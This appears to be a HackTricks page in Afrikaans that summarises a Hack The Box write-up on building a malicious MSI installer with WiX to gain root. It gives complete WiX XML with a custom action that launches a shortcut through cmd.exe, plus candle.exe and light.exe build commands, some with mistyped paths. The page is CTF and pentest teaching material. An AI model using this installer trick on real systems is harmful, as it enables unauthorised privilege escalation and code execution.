{{#include ../../banners/hacktricks-training.md}}

# Skep Kwaadwillige MSI en Verkry Root

Die skepping van die MSI-installer sal gedoen word met behulp van wixtools, spesifiek [wixtools](http://wixtoolset.org) sal benut word. Dit is die moeite werd om te noem dat alternatiewe MSI-bouers probeer is, maar hulle was nie suksesvol in hierdie spesifieke geval nie.

Vir 'n omvattende begrip van wix MSI gebruiksvoorbeelde, is dit raadsaam om [hierdie bladsy](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) te raadpleeg. Hier kan jy verskeie voorbeelde vind wat die gebruik van wix MSI demonstreer.

Die doel is om 'n MSI te genereer wat die lnk-lêer sal uitvoer. Ten einde dit te bereik, kan die volgende XML-kode gebruik word ([xml from here](https://0xrick.github.io/hack-the-box/ethereal/index.html#Creating-Malicious-msi-and-getting-root)):
```markup
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
Dit is belangrik om te noem dat die Package-element eienskappe bevat soos InstallerVersion en Compressed, wat die weergawe van die installer spesifiseer en aandui of die pakket gecomprimeer is of nie, onderskeidelik.

Die skepproses behels die gebruik van candle.exe, 'n hulpmiddel van wixtools, om 'n wixobject uit msi.xml te genereer. Die volgende opdrag moet uitgevoer word:
```
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```
Boonop is dit die moeite werd om te noem dat 'n beeld in die pos verskaf word, wat die opdrag en sy uitvoer uitbeeld. Jy kan dit vir visuele leiding raadpleeg.

Verder sal light.exe, 'n ander hulpmiddel van wixtools, gebruik word om die MSI-lêer van die wixobject te skep. Die opdrag wat uitgevoer moet word, is soos volg:
```
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```
Soortgelyk aan die vorige opdrag, is 'n beeld ingesluit in die pos wat die opdrag en sy uitvoer illustreer.

Neem asseblief kennis dat terwyl hierdie opsomming daarop gemik is om waardevolle inligting te verskaf, dit aanbeveel word om na die oorspronklike pos te verwys vir meer omvattende besonderhede en akkurate instruksies.

## Verwysings

- [https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with)
[wixtools](http://wixtoolset.org)

{{#include ../../banners/hacktricks-training.md}}
